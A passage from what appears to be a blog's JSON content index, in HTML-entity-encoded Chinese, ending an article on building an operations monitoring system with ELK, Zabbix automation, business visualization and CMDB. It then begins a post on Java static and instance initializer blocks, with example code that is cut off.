&#x65E5;&#x5FD7;&#x76D1;&#x63A7;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x4EA7;&#x751F;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x3001;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4F1A;&#x6709;&#x5E94;&#x7528;&#x7684;&#x8BBF;&#x95EE;&#x65E5;&#x5FD7;&#x3001;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x670D;&#x52A1;&#x6709;&#x8FD0;&#x884C;&#x65E5;&#x5FD7;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ELK&#x6765;&#x8FDB;&#x884C;&#x65E5;&#x5FD7;&#x76D1;&#x63A7;&#x3002; &#x5BF9;&#x4E8E;&#x65E5;&#x5FD7;&#x6765;&#x8BF4;&#xFF0C;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x9700;&#x6C42;&#x5C31;&#x662F;&#x6536;&#x96C6;&#x3001;&#x5B58;&#x50A8;&#x3001;&#x67E5;&#x8BE2;&#x3001;&#x5C55;&#x793A;&#xFF0C;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x6B63;&#x597D;&#x6709;&#x76F8;&#x5BF9;&#x5E94;&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#xFF1A; logstash&#xFF08;&#x6536;&#x96C6;&#xFF09;elasticsearch&#xFF08;&#x5B58;&#x50A8;+&#x641C;&#x7D22;&#xFF09;kibana&#xFF08;&#x5C55;&#x793A;&#xFF09;&#x6211;&#x4EEC;&#x5C06;&#x8FD9;&#x4E09;&#x4E2A;&#x7EC4;&#x5408;&#x8D77;&#x6765;&#x7684;&#x6280;&#x672F;&#x79F0;&#x4E4B;&#x4E3A;ELK Stack&#xFF0C;&#x6240;&#x4EE5;&#x8BF4;ELK Stack&#x6307;&#x7684;&#x662F;Elasticsearch&#x3001;Logstash&#x3001;Kibana&#x6280;&#x672F;&#x6808;&#x7684;&#x7ED3;&#x5408;&#x3002; &#x5982;&#x679C;&#x6536;&#x96C6;&#x4E86;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#xFF0C;&#x90A3;&#x4E48;&#x5982;&#x679C;&#x90E8;&#x7F72;&#x66F4;&#x65B0;&#x6709;&#x5F02;&#x5E38;&#x51FA;&#x73B0;&#xFF0C;&#x53EF;&#x4EE5;&#x7ACB;&#x5373;&#x5728;kibana&#x4E0A;&#x770B;&#x5230;&#x3002;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Zabbix&#x6765;&#x8FDB;&#x884C;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x7684;&#x8FC7;&#x6EE4;&#x6765;&#x8FDB;&#x884C;&#x544A;&#x8B66;&#x3002; 2.10 &#x81EA;&#x52A8;&#x5316;&#x7ECF;&#x8FC7;&#x52AA;&#x529B;&#xFF0C;&#x5C0F;&#x738B;&#x5B8C;&#x6210;&#x4ECE;&#x76D1;&#x63A7;&#x83DC;&#x9E1F;&#x5230;&#x5934;&#x8111;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x5B8C;&#x6574;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x7684;&#x9006;&#x88AD;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5927;&#x89C4;&#x6A21;&#x7684;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x65E0;&#x6CD5;&#x505A;&#x5230;&#x81EA;&#x52A8;&#x5316;&#x76D1;&#x63A7;&#xFF0C;&#x90A3;&#x4E48;&#x624B;&#x52A8;&#x6DFB;&#x52A0;&#x76D1;&#x63A7;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x4E00;&#x4E2A;&#x6050;&#x6016;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x65E0;&#x6CD5;&#x4FDD;&#x8BC1;&#x5B8C;&#x6574;&#x6027;&#x3002; &#x81EA;&#x52A8;&#x5316;&#x7684;&#x65B9;&#x6848;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x901A;&#x5E38;&#x6709;&#x4E3B;&#x52A8;&#x548C;&#x88AB;&#x52A8;&#x4E0D;&#x540C;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x8FD9;&#x91CC;&#x76F8;&#x5BF9;Zabbix&#x6765;&#x8BF4;&#x3002; &#x4E3B;&#x52A8;&#x5F62;&#x5F0F;&#xFF1A; &#x6BD4;&#x5982;&#x4F7F;&#x7528;Zabbix&#x7684;&#x81EA;&#x52A8;&#x53D1;&#x73B0;&#xFF0C;&#x4E3B;&#x52A8;&#x7684;&#x5BF9;&#x5168;&#x7F51;&#x8FDB;&#x884C;&#x626B;&#x63CF;&#xFF0C;&#x7136;&#x540E;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;&#x76F8;&#x5173;&#x7684;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5F15;&#x7528;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002; &#x88AB;&#x52A8;&#x5F62;&#x5F0F;&#xFF1A; &#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Zabbix API&#x8FDB;&#x884C;&#x88AB;&#x52A8;&#x7684;&#x76D1;&#x63A7;&#x7684;&#x6DFB;&#x52A0;&#x3002;&#x6BD4;&#x5982;&#x4EE5;CMDB&#x4E3A;&#x6838;&#x5FC3;&#xFF0C;&#x5982;&#x679C;&#x68C0;&#x6D4B;&#x5230;&#x67D0;&#x670D;&#x52A1;&#x5668;&#x589E;&#x52A0;&#x4E86;Nginx&#x670D;&#x52A1;&#xFF0C;&#x90A3;&#x4E48;&#x81EA;&#x52A8;&#x8C03;&#x7528;Zabbix API&#x6DFB;&#x52A0;&#x4E0A;Nginx&#x7684;&#x76D1;&#x63A7;&#x6A21;&#x677F;&#x3002; &#x771F;&#x6B63;&#x60F3;&#x505A;&#x5230;&#x66F4;&#x5B8C;&#x6574;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#xFF0C;&#x76EE;&#x524D;&#x7684;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#xFF0C;&#x786E;&#x5B9E;&#x65E0;&#x6CD5;&#x5F88;&#x597D;&#x7684;&#x6EE1;&#x8DB3;&#xFF0C;&#x6709;&#x6761;&#x4EF6;&#x7684;&#x516C;&#x53F8;&#x90FD;&#x5F00;&#x59CB;&#x81EA;&#x5DF1;&#x5F00;&#x53D1;&#x81EA;&#x5DF1;&#x7684;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BD4;&#x5982;&#x5C0F;&#x7C73;&#x5F00;&#x6E90;&#x7684;Open-Falcon&#x3002; &#x4E5F;&#x6709;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x5F00;&#x6E90;&#x7684;&#x76D1;&#x63A7;&#x6846;&#x67B6;&#x5982;Sensu&#x7B49;&#xFF0C;&#x518D;&#x52A0;&#x4E0A;influxdb grafana&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5B9A;&#x5236;&#x7B26;&#x5408;&#x81EA;&#x5DF1;&#x4F01;&#x4E1A;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x3002; 2.11 &#x53EF;&#x89C6;&#x5316;&#x7ECF;&#x8FC7;&#x5C0F;&#x738B;&#x7684;&#x5404;&#x79CD;&#x52AA;&#x529B;&#xFF0C;&#x7EC8;&#x4E8E;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x5B8C;&#x5584;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x4F7F;&#x7528;Zabbix&#x6784;&#x5EFA;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x5C0F;&#x738B;&#x4E3A;&#x6B64;&#x8FD8;&#x505A;&#x4E00;&#x4E2A;&#x6F02;&#x4EAE;&#x7684;screen&#xFF0C;&#x6765;&#x8FDB;&#x884C;&#x5C55;&#x793A;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x4E00;&#x5929;&#x7A81;&#x7136;&#x8BA2;&#x5355;&#x91CF;&#x7279;&#x522B;&#x5C11;&#xFF0C;&#x5F20;&#x603B;&#x53C8;&#x4E00;&#x6B21;&#x5230;&#x4E86;&#x8FD0;&#x7EF4;&#x90E8;&#xFF0C;&#x4F46;&#x5931;&#x671B;&#x800C;&#x5F52;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x5E76;&#x4E0D;&#x80FD;&#x53CD;&#x6620;&#x51FA;&#x6765;&#x8BA2;&#x5355;&#x91CF;&#x4E3A;&#x4EC0;&#x4E48;&#x51CF;&#x5C11;&#x4E86;&#xFF1F; &#x8FD0;&#x7EF4;&#x7684;&#x91CD;&#x8981;&#x76EE;&#x6807;&#x4E4B;&#x4E00;&#x5C31;&#x662F;&#x6570;&#x636E;&#x7684;&#x53EF;&#x89C6;&#x5316;&#xFF0C;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x4E0D;&#x80FD;&#x5F88;&#x597D;&#x7684;&#x53CD;&#x6620;&#x51FA;&#x6765;&#x4E1A;&#x52A1;&#x7684;&#x6CE2;&#x52A8;&#xFF0C;&#x5C31;&#x662F;&#x800D;&#x6D41;&#x6C13;&#x3002;&#x4E4B;&#x524D;&#x7684;&#x4E00;&#x5207;&#x52AA;&#x529B;&#x5728;&#x4E1A;&#x52A1;&#x90E8;&#x95E8;&#x7684;&#x9886;&#x5BFC;&#x4E2D;&#x53D8;&#x5F97;&#x4E00;&#x6587;&#x4E0D;&#x503C;&#xFF01;&#xFF01;&#xFF01; &#x6211;&#x4EEC;&#x80FD;&#x505A;&#x7684;&#x6709;&#x4EE5;&#x4E0B;&#x51E0;&#x70B9;&#xFF1A; &#x9762;&#x5411;&#x4F20;&#x7EDF;&#x8FD0;&#x7EF4;&#xFF1A; &#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5B8C;&#x5584;&#x4E1A;&#x52A1;&#x76D1;&#x63A7;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x4E13;&#x95E8;&#x7684;&#x4E1A;&#x52A1;&#x5206;&#x6790;&#x7CFB;&#x7EDF;&#xFF0C;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x548C;&#x8FD0;&#x7EF4;&#x7684;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x8FDB;&#x884C;&#x7ED3;&#x5408;&#x3002; &#x68B3;&#x7406;&#x6E05;&#x695A;&#x5404;&#x4E2A;&#x5B50;&#x7CFB;&#x7EDF;&#x4E4B;&#x95F4;&#x548C;&#x4E1A;&#x52A1;&#x7684;&#x5173;&#x7CFB;&#xFF0C;&#x6BD4;&#x5982;&#x5982;&#x679C;&#x7A81;&#x7136;&#x95F4;&#x6D41;&#x91CF;&#x589E;&#x52A0;&#x4E86;50M&#xFF0C;&#x80FD;&#x591F;&#x5FEB;&#x901F;&#x7684;&#x77E5;&#x9053;&#x8FD9;50M&#x6D41;&#x91CF;&#x5230;&#x4E86;&#x90A3;&#x4E2A;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x4E0A;&#xFF0C;&#x8BBF;&#x95EE;&#x7684;&#x54EA;&#x4E9B;URL&#xFF0C;&#x4EE5;&#x53CA;&#x8FD9;&#x4E2A;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x7684;&#x76F8;&#x5173;&#x72B6;&#x6001;&#x3002; &#x9762;&#x5411;DevOps&#xFF1A; &#x5C06;&#x6240;&#x6709;&#x7684;&#x76D1;&#x63A7;&#x9879;&#x548C;&#x4E1A;&#x52A1;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x5173;&#x7CFB;&#x6811;&#xFF0C;&#x6BD4;&#x5982;&#x4E1A;&#x52A1;&#x3001;&#x7F51;&#x7EDC;&#x3001;&#x7CFB;&#x7EDF;&#x3001;&#x6570;&#x636E;&#x5E93;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x63A8;&#x5E7F;&#x6D3B;&#x52A8;&#xFF08;&#x6D41;&#x91CF;&#x5206;&#x6790;&#xFF09;&#x4E4B;&#x95F4;&#x53EF;&#x4EE5;&#x5F62;&#x6210;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x5173;&#x7CFB;&#x94FE;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x5E9E;&#x5927;&#x7684;&#x5DE5;&#x7A0B;&#xFF0C;&#x4E1A;&#x52A1;&#x662F;&#x591A;&#x53D8;&#x7684;&#xFF0C;&#x5982;&#x4F55;&#x8BA9;&#x76D1;&#x63A7;&#x5E73;&#x53F0;&#x80FD;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x9002;&#x5E94;&#x591A;&#x53D8;&#x7684;&#x4E1A;&#x52A1;&#x662F;&#x4E00;&#x4E2A;&#x8270;&#x5DE8;&#x7684;&#x4EFB;&#x52A1;&#x3002; &#x5230;&#x9762;&#x8BD5;&#x7ED3;&#x675F;&#x8BE5;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x65E0;&#x8BBA;&#x600E;&#x4E48;&#x52AA;&#x529B;&#x589E;&#x52A0;&#xFF0C;&#x8FD8;&#x662F;&#x89C9;&#x5F97;&#x603B;&#x6709;&#x6F0F;&#x4E0B;&#x7684;&#x3002; &#x76D1;&#x63A7;&#x7684;&#x8BDD;&#x9898;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5F88;&#x591A;&#xFF0C;&#x6BD4;&#x5982;&#x8FD8;&#x6709;&#x548C;&#x8FD0;&#x7EF4;&#x76F8;&#x5173;&#x7684;&#x9875;&#x9762;&#x6027;&#x80FD;&#x76D1;&#x63A7;&#xFF08;&#x9875;&#x9762;&#x8D44;&#x6E90;&#x6570;&#x91CF;&#x3001;DNS&#x89E3;&#x6790;&#x65F6;&#x95F4;&#x3001;&#x9996;&#x5C4F;&#x65F6;&#x95F4;&#x3001;&#x52A0;&#x8F7D;&#x6700;&#x6162;&#x7684;&#x8D44;&#x6E90;&#x3001;&#x4EA7;&#x751F;&#x963B;&#x585E;&#x7684;JS&#x7B49;&#xFF09;&#x3001;&#x4EE3;&#x7801;&#x76D1;&#x63A7;&#x3001;&#x4E0E;&#x8FD0;&#x7EF4;&#x65E0;&#x5173;&#x7684;&#x8206;&#x8BBA;&#x76D1;&#x63A7;&#x7B49;&#xFF0C;&#x5148;&#x8FD9;&#x4E48;&#x591A;&#x5427;&#xFF01; &#x597D;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x662F;&#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;&#x5F15;&#x5165;&#x7684;&#x76D1;&#x63A7;&#x7684;&#x8BDD;&#x9898;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4ECE;&#x9762;&#x8BD5;&#x7ED3;&#x675F;&#x5427;&#xFF01;&#x4E0B;&#x6B21;&#x518D;&#x9047;&#x5230;&#x7C7B;&#x4F3C;&#x7684;&#x9762;&#x8BD5;&#x9898;&#xFF0C;&#x6211;&#x76F8;&#x4FE1;&#x8BFB;&#x8005;&#x5FC3;&#x91CC;&#x4E00;&#x5B9A;&#x6709;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x7B54;&#x6848;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x5728;&#x8BE6;&#x8FF0;&#xFF0C;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x5B8C;&#x5584;&#x7684;&#x8FD0;&#x7EF4;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5728;&#x4F60;&#x8111;&#x6D77;&#x4E2D;&#x5F62;&#x6210;&#x4E86;&#x5462;&#xFF1F; &#x5C0F;&#x8D34;&#x58EB;&#xFF1A;&#x9762;&#x8BD5;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x9047;&#x5230;&#x4E00;&#x4E2A;&#x6709;&#x5F88;&#x5F3A;&#x7684;&#x8D23;&#x4EFB;&#x5FC3;&#xFF0C;&#x8FDE;&#x6D17;&#x6FA1;&#x90FD;&#x8981;&#x5E26;&#x4E0A;&#x624B;&#x673A;&#xFF0C;&#x4EE5;&#x514D;&#x9519;&#x8FC7;&#x62A5;&#x8B66;&#x7684;&#x4EBA;&#xFF0C;&#x4E0D;&#x8981;&#x72B9;&#x8C6B;&#xFF0C;&#x5148;&#x62DB;&#x8FDB;&#x6765;&#x518D;&#x6162;&#x6162;&#x57F9;&#x517B;&#x5427;&#x3002;&#x8D23;&#x4EFB;&#x5FC3;&#x662F;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x7684;&#x7B2C;&#x4E00;&#x8981;&#x7D20;&#xFF01; &#x540E;&#x8BB0;&#xFF1A;&#x5C0F;&#x738B;&#x7684;&#x6545;&#x4E8B;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x5C0F;&#x738B;&#x76EE;&#x524D;&#x88AB;&#x76D1;&#x63A7;&#x7684;&#x5173;&#x7CFB;&#x6811;&#x953B;&#x70BC;&#x7684;&#x8FDE;&#x738B;&#x83F2;&#x3001;&#x674E;&#x4E9A;&#x9E4F;&#x7684;&#x5173;&#x7CFB;&#x90FD;&#x80FD;&#x641E;&#x660E;&#x767D;&#x4E86;&#x3002;&#x53EF;&#x662F;&#x4F60;&#x5462;&#xFF1F; &#x5982;&#x679C;&#x4F60;&#x662F;&#x4E00;&#x540D;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#xFF0C;&#x52A8;&#x624B;&#x5E72;&#x5427;&#xFF0C;&#x76D1;&#x63A7;&#x4F1A;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x65AD;&#x5B8C;&#x5584;&#x7684;&#x5DE5;&#x7A0B;&#xFF0C;&#x8FD9;&#x5C31;&#x662F;&#x8FD0;&#x7EF4;&#xFF08;&#x8FD0;&#x8425;&#xFF09;&#x548C;&#x9879;&#x76EE;&#x7684;&#x672C;&#x8D28;&#x533A;&#x522B;&#x3002; &#x5982;&#x679C;&#x4F60;&#x662F;&#x4E00;&#x540D;Devops&#xFF0C;&#x90A3;&#x4E48;&#x5F00;&#x59CB;&#x7F16;&#x7A0B;&#x5427;&#xFF01; &#x5982;&#x679C;&#x4F60;&#x662F;&#x4E00;&#x540D;&#x8001;&#x677F;&#xFF0C;&#x7ED9;&#x516C;&#x53F8;&#x7684;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x4E00;&#x4E2A;&#x8F6C;&#x53D8;&#x7684;&#x673A;&#x4F1A;&#x548C;&#x4E00;&#x4E9B;&#x65F6;&#x95F4;&#xFF0C;&#x4EBA;&#x603B;&#x662F;&#x4E0D;&#x65AD;&#x8FDB;&#x6B65;&#x7684;&#xFF01; FAQ&#xFF1A;&#x6545;&#x969C;&#x81EA;&#x52A8;&#x5904;&#x7406;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#xFF1F;&#x4E0D;&#x540C;&#x4E1A;&#x52A1;&#x5F62;&#x6001;&#x3001;&#x4E0D;&#x540C;&#x67B6;&#x6784;&#x3001;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x53EF;&#x80FD;&#x91C7;&#x7528;&#x7684;&#x65B9;&#x5F0F;&#x90FD;&#x4E0D;&#x540C;&#xFF0C;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;&#x4E00;&#x4E2A;&#x56FA;&#x5B9A;&#x7684;&#x4E1C;&#x897F;&#x5206;&#x4EAB;&#x3002;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E4B;&#x524D;&#x817E;&#x8BAF;&#x84DD;&#x9CB8;&#x7684;&#x5206;&#x4EAB;&#xFF0C;&#x4ED6;&#x4EEC;&#x5B9E;&#x73B0;&#x4E86;&#x6545;&#x969C;&#x81EA;&#x6108;&#x7684;&#x529F;&#x80FD;&#x3002; &#x8FD0;&#x7EF4;&#x9700;&#x8981;&#x61C2;&#x4E1A;&#x52A1;&#x5417;&#xFF1F;&#x6211;&#x4E2A;&#x4EBA;&#x7684;&#x89C2;&#x70B9;&#x662F;&#x61C2;&#x4E1A;&#x52A1;&#x80FD;&#x8BA9;&#x8FD0;&#x7EF4;&#x8D70;&#x7684;&#x66F4;&#x8FDC;&#xFF0C;&#x8FD0;&#x7EF4;&#x670D;&#x52A1;&#x7684;&#x5BF9;&#x8C61;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x5176;&#x5B83;&#x90E8;&#x95E8;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x80FD;&#x662F;&#x7EC8;&#x7AEF;&#x7528;&#x6237;&#x5462;&#xFF1F; &#x53EF;&#x4EE5;&#x7AD9;&#x5728;&#x7EC8;&#x7AEF;&#x7528;&#x6237;&#x7684;&#x89C6;&#x89D2;&#x6765;&#x505A;&#x8FD0;&#x7EF4;&#xFF0C;&#x6BD4;&#x5982;&#x6709;&#x7528;&#x6237;&#x53CD;&#x6620;&#x8BBF;&#x95EE;&#x6162;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x6162;&#xFF0C;&#x662F;&#x67B6;&#x6784;&#x7684;&#x539F;&#x56E0;&#xFF0C;Nginx&#x914D;&#x7F6E;&#x7684;&#x539F;&#x56E0;&#xFF0C;&#x8FD8;&#x662F;&#x6570;&#x636E;&#x5E93;&#x7684;&#x539F;&#x56E0;&#x3002; &#x4E0D;&#x8981;&#x7B49;&#x7740;&#x9886;&#x5BFC;&#x6765;&#x5B89;&#x6392;&#xFF0C;&#x8FD0;&#x7EF4;&#x80FD;&#x5E26;&#x6765;&#x7684;&#x4EF7;&#x503C;&#x662F;&#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x81EA;&#x5DF1;&#x505A;&#x51FA;&#x6765;&#x7684;&#xFF0C;&#x601D;&#x60F3;&#x6709;&#x591A;&#x8FDC;&#xFF0C;&#x8FD0;&#x7EF4;&#x5C31;&#x80FD;&#x8D70;&#x591A;&#x8FDC;&#xFF01; &#x90A3;&#x4E48;&#x76D1;&#x63A7;&#x5728;&#x8FD9;&#x91CC;&#x53D1;&#x6325;&#x7684;&#x4F5C;&#x7528;&#x5C31;&#x662F;&#xFF1A;&#x8BA9;&#x6570;&#x636E;&#x8BF4;&#x8BDD;&#xFF01; &#x505A;&#x76D1;&#x63A7;&#x4E5F;&#x9700;&#x8981;CMDB&#x5417;&#xFF1F;&#x6211;&#x8BA4;&#x4E3A;CMDB&#x662F;&#x57FA;&#x7840;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x5728;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x7684;&#x6A21;&#x5F0F;&#x4E0B;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x5730;&#x65B9;&#x80FD;&#x51C6;&#x786E;&#x7684;&#x63D0;&#x4F9B;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x653E;&#x5728;&#x54EA;&#x4E2A;&#x4F4D;&#x7F6E;&#x3001;&#x914D;&#x7F6E;&#x662F;&#x4EC0;&#x4E48;&#xFF1F;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x8D2D;&#x4E70;&#x7684;&#xFF1F;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x8FC7;&#x4FDD;&#xFF1F;&#x90FD;&#x8FD0;&#x884C;&#x4E86;&#x54EA;&#x4E9B;&#x670D;&#x52A1;&#x3001;&#x5F00;&#x653E;&#x4E86;&#x4EC0;&#x4E48;&#x7AEF;&#x53E3;&#x3001;&#x7248;&#x672C;&#x662F;&#x4EC0;&#x4E48;&#xFF08;&#x5347;&#x7EA7;&#x65F6;&#x4F7F;&#x7528;&#xFF09;&#x3002; &#x6709;&#x4E86;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x548C;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x3001;&#x90E8;&#x7F72;&#x7CFB;&#x7EDF;&#x3001;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x6709;&#x6548;&#x7684;&#x7ED3;&#x5408;&#x8D77;&#x6765;&#x3002;&#x603B;&#x7ED3;&#x8D77;&#x6765;&#x5C31;&#x662F;&#xFF1A;&#x4EE5;&#x4E1A;&#x52A1;&#x4E3A;&#x5BFC;&#x5411;&#x3001;&#x4EE5;CMDB&#x4E3A;&#x4E2D;&#x5FC3;&#x3001;&#x4EE5;API&#x4E3A;&#x57FA;&#x7840;&#x6765;&#x8FDB;&#x884C;&#x8FD0;&#x7EF4;&#x4F53;&#x7CFB;&#x7684;&#x5EFA;&#x8BBE;&#x3002; &#x6709;&#x4E86;CMDB&#x7684;&#x6570;&#x636E;&#x652F;&#x6491;&#xFF0C;&#x90A3;&#x4E9B;&#x770B;&#x7740;&#x9AD8;&#x5927;&#x4E0A;&#x7684;&#x81EA;&#x52A8;&#x7ED8;&#x51FA;&#x67B6;&#x6784;&#x56FE;&#x548C;&#x673A;&#x67DC;&#x56FE;&#x5C31;&#x4E0D;&#x662F;&#x96BE;&#x4E8B;&#x4E86;&#x3002;","raw":null,"content":null,"categories":[{"name":"我的收藏","slug":"我的收藏","permalink":"http://www.wangxin123.com/categories/我的收藏/"}],"tags":[{"name":"运维","slug":"运维","permalink":"http://www.wangxin123.com/tags/运维/"},{"name":"监控","slug":"监控","permalink":"http://www.wangxin123.com/tags/监控/"}]},{"title":"初始化块和静态初始化块的区别","slug":"初始化块和静态初始化块的区别","date":"2016-06-06T15:42:00.000Z","updated":"2017-02-21T08:25:03.444Z","comments":true,"path":"2016/06/06/初始化块和静态初始化块的区别/","link":"","permalink":"http://www.wangxin123.com/2016/06/06/初始化块和静态初始化块的区别/","excerpt":"&#x521D;&#x59CB;&#x5316;&#x5757;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5757;&#x7684;&#x5185;&#x5BB9;&#x603B;&#x662F;&#x50BB;&#x50BB;&#x5206;&#x4E0D;&#x6E05;&#xFF0C;&#x4ECA;&#x5929;&#x7279;&#x610F;&#x6574;&#x7406;&#x4E86;&#x4E0B;&#x3002;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x4E0D;&#x770B;&#x6587;&#x7AE0;&#x524D;&#x9762;&#x5185;&#x5BB9;&#xFF0C;&#x5148;&#x8BD5;&#x8BD5;&#x6700;&#x540E;&#x7684;&#x90A3;&#x9053;&#x6D4B;&#x8BD5;&#x9898;&#x3002;","keywords":null,"text":"&#x521D;&#x59CB;&#x5316;&#x5757;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5757;&#x7684;&#x5185;&#x5BB9;&#x603B;&#x662F;&#x50BB;&#x50BB;&#x5206;&#x4E0D;&#x6E05;&#xFF0C;&#x4ECA;&#x5929;&#x7279;&#x610F;&#x6574;&#x7406;&#x4E86;&#x4E0B;&#x3002;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x4E0D;&#x770B;&#x6587;&#x7AE0;&#x524D;&#x9762;&#x5185;&#x5BB9;&#xFF0C;&#x5148;&#x8BD5;&#x8BD5;&#x6700;&#x540E;&#x7684;&#x90A3;&#x9053;&#x6D4B;&#x8BD5;&#x9898;&#x3002; &#x6D4B;&#x8BD5;&#x4EE3;&#x7801;1&#x3001;static&#x521D;&#x59CB;&#x5316;&#x5757;static&#x521D;&#x59CB;&#x5316;&#x5757;&#x662F;&#x5728;&#x6784;&#x9020;&#x51FD;&#x6570;&#x4E4B;&#x524D;&#x6267;&#x884C;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x53EA;&#x6267;&#x884C;&#x4E00;&#x6B21;&#xFF0C;&#x5373;&#x7C7B;&#x9996;&#x6B21;&#x52A0;&#x8F7D;&#x65F6;&#x3002; &#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A; 2&#x3001;&#x521D;&#x59CB;&#x5316;&#x5757;&lt;(&#xFFE3;&#xFE36;&#xFFE3;)&gt;&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A; &#x539F;&#x4EE3;&#x7801;&#xFF1A;1234567891011121314151617181920212223242526272829303132333435package dem;public class A extends B { public A() { System.out.println(&quot;A&#x6784;&#x9020;&#x65B9;&#x6CD5;&quot;); } static { System.out.println(&quot;A&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5757;&quot;); } { System.out.println(&quot;A&#x521D;&#x59CB;&#x5316;&#x5757;&quot;); } public static void main(String[] args) { new A(); System.out.println(&quot;--------&quot;); new A(); }}class B { public B() { System.out.println(&quot;B&#x6784;&#x9020;&#x65B9;&#x6CD5;&quot;); } static { System.out.println(&quot;B&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5757;&quot;); } { System.out.println(&quot;B&#x521D;&#x59CB;&#x5316;&#x5757;&quot;); 